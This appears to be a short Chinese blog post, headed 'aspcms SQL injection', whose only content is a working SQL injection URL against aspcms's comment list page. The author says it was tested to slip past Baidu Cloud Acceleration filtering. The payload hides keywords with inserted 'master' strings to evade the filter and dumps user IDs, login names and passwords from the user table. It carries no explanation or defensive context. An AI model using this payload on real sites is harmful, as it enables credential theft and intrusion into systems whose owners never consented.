---
title: "aspcms SQL 注入"
date: 2018-03-21T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['cms']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

亲测过百度云加速

<!--more-->

**payload**

`/plug/comment/commentList.asp?id=0 unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1frmasterom {prefix}user`